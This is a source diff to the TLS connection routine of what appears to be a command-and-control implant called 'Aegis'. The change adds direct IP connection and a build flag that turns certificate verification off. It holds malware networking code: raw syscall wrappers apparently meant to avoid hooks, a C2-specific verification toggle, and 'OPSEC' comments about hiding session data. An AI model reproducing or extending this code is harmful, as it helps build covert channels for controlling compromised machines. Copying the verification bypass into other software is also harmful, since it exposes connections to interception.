@@ -101,21 +101,28 @@ static aegis_result_t tls_connect(tls_conn_t *conn, const char *host,
   char port_str[8];
   snprintf(port_str, sizeof(port_str), "%u", port);
 
-  if (getaddrinfo(host, port_str, &hints, &result) != 0)
-    return AEGIS_ERR_NETWORK;
+  struct sockaddr_in sa;
+  memset(&sa, 0, sizeof(sa));
+  bool is_ip = (inet_pton(AF_INET, host, &sa.sin_addr) == 1);
 
-  /* Create socket via raw syscall */
   long sfd = raw_socket(AF_INET, SOCK_STREAM, 0);
-  if (sfd < 0) {
-    freeaddrinfo(result);
-    return AEGIS_ERR_SYSCALL;
-  }
+  if (sfd < 0) return AEGIS_ERR_SYSCALL;
   conn->sockfd = (int)sfd;
 
-  /* Connect via raw syscall */
-  long cret =
-      raw_connect(conn->sockfd, result->ai_addr, (socklen_t)result->ai_addrlen);
-  freeaddrinfo(result);
+  long cret;
+  if (is_ip) {
+      sa.sin_family = AF_INET;
+      sa.sin_port = htons(port);
+      cret = raw_connect(conn->sockfd, (struct sockaddr *)&sa, sizeof(sa));
+  } else {
+      if (getaddrinfo(host, port_str, &hints, &result) != 0) {
+          raw_close(conn->sockfd);
+          return AEGIS_ERR_NETWORK;
+      }
+      cret = raw_connect(conn->sockfd, result->ai_addr, (socklen_t)result->ai_addrlen);
+      freeaddrinfo(result);
+  }
+
   if (cret < 0) {
     raw_close(conn->sockfd);
     return AEGIS_ERR_NETWORK;
@@ -130,6 +137,15 @@ static aegis_result_t tls_connect(tls_conn_t *conn, const char *host,
 
   /* Force TLS 1.3 minimum */
   SSL_CTX_set_min_proto_version(conn->ssl_ctx, TLS1_3_VERSION);
+
+  /* Set verification based on configuration */
+  #if defined(AEGIS_C2_SKIP_SSL_VERIFY) && AEGIS_C2_SKIP_SSL_VERIFY == 1
+    SSL_CTX_set_verify(conn->ssl_ctx, SSL_VERIFY_NONE, NULL);
+  #else
+    /* Use default verification (load system CA store) */
+    SSL_CTX_set_default_verify_paths(conn->ssl_ctx);
+    SSL_CTX_set_verify(conn->ssl_ctx, SSL_VERIFY_PEER, NULL);
+  #endif
 
   /* Disable session caching (OPSEC: prevents session ticket disclosure) */
   SSL_CTX_set_session_cache_mode(conn->ssl_ctx, SSL_SESS_CACHE_OFF);
